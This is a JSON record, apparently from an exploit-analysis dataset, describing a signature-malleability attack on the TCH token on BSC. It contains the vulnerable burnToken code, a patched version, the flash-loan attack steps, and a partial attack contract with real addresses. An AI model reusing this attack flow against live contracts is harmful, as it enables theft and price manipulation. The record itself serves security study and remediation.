@@ -1,0 +1,38 @@
+{
+ "id": "2024__2024-05-XX_TCH_BurnTokenSignatureMalleable",
+ "source_file": "2024/2024-05-XX_TCH_BurnTokenSignatureMalleable.md",
+ "title": "TCH — burnToken Signature Malleability Analysis",
+ "date": "2024-05-01",
+ "protocol": "TCH",
+ "chain": "BSC",
+ "loss_raw": "~$18,000",
+ "loss_usd": 18000.0,
+ "root_cause": "The `burnToken(uint256 amount, uint256 nonce, bytes memory signature)` function accepts manipulated signatures as valid even when the last byte (`v` value) is altered from `0x1c`→`0x01` or `0x1b`→`0x00` — a signature malleability vulnerability. Called 34 times to mass-burn TCH → price distortion followed by profit-taking",
+ "attack_tx": null,
+ "vulnerable_contract": "TCH 0x5d78CFc8",
+ "classes": [
+  "signature-replay"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: ecrecover without v value normalization\ncontract TCHToken {\n    mapping(uint256 => bool) public usedNonces;\n\n    function burnToken(uint256 amount, uint256 nonce, bytes memory signature) external {\n        // No protection against duplicate nonce usage (or bypassed via tampered signature)\n        bytes32 msgHash = keccak256(abi.encodePacked(msg.sender, amount, nonce));\n        bytes32 ethHash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", msgHash));\n\n        // No v value normalization\n        (uint8 v, bytes32 r, bytes32 s) = splitSignature(signature);\n        // v = 0x00 or 0x01 may also be accepted as valid inside ecrecover\n        address signer = ecrecover(ethHash, v, r, s);\n        require(signer == authorizedSigner, \"invalid signature\");\n\n        // No nonce reuse protection → repeated calls possible with tampered signature\n        _burn(msg.sender, amount);\n    }\n}\n\n//",
+  "// File: TCH_decompiled.sol\ncontract TCH {\n    function burnToken(uint256 p0, uint256 p1, bytes memory p2) external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: Use OpenZeppelin ECDSA + nonce tracking\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\nfunction burnToken(uint256 amount, uint256 nonce, bytes memory signature) external {\n    require(!usedNonces[nonce], \"nonce already used\");\n    usedNonces[nonce] = true;\n\n    bytes32 msgHash = keccak256(abi.encodePacked(msg.sender, amount, nonce));\n    // OpenZeppelin ECDSA: v normalization + signature malleability prevention\n    address signer = ECDSA.recover(ECDSA.toEthSignedMessageHash(msgHash), signature);\n    require(signer == authorizedSigner, \"invalid signature\");\n    _burn(msg.sender, amount);\n}"
+ ],
+ "steps": [
+  "→ [1] V3 Flash Loan: 2,500,000 BUSDT",
+  "→ [2] Swap BUSDT → TCH",
+  "→ [3] Tamper the v byte of a legitimate signature (0x1c → 0x01, etc.)",
+  "→ [4] burnToken(amount, nonce, tamperedSig) × 34 calls",
+  "TCH burned on every call → supply collapses",
+  "→ [5] TCH price spikes (reduced supply)",
+  "→ [6] Swap TCH → BUSDT (at elevated price)",
+  "→ [7] Repay V3 flash loan",
+  "→ [8] ~$18K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] V3 Flash Loan: 2,500,000 BUSDT\n  │\n  ├─→ [2] Swap BUSDT → TCH\n  │\n  ├─→ [3] Tamper the v byte of a legitimate signature (0x1c → 0x01, etc.)\n  │\n  ├─→ [4] burnToken(amount, nonce, tamperedSig) × 34 calls\n  │         └─ Accepted as valid due to signature malleability\n  │         └─ TCH burned on every call → supply collapses\n  │\n  ├─→ [5] TCH price spikes (reduced supply)\n  │\n  ├─→ [6] Swap TCH → BUSDT (at elevated price)\n  │\n  ├─→ [7] Repay V3 flash loan\n  │\n  └─→ [8] ~$18K profit",
+  "interface ITCHToken {\n    function burnToken(uint256 amount, uint256 nonce, bytes memory signature) external;\n}\n\ncontract AttackContract {\n    ITCHToken constant tch  = ITCHToken(0x5d78CFc8732fd328015C9B73699dE9556EF06E8E);\n    IERC20    constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n\n    // Original signature (obtained via a legitimate path)\n    bytes originalSig;\n\n    function testExploit() external {\n        // [1] Flash loan 2.5M BUSDT\n        flashLoan(2_500_000e18);\n    }\n\n    function flashCallback() external {\n        // [2] Swap BUSDT → TCH\n        swapBUSDTToTCH(2_500_000e18);\n\n        // [3] Call burnToken 34 times with tampered v byte signatures\n        for (uint i = 0; i < 34; i++) {\n            // Tamper the last byte of signature: 0x1c → 0x01 or 0x1b → "
+ ]
+}
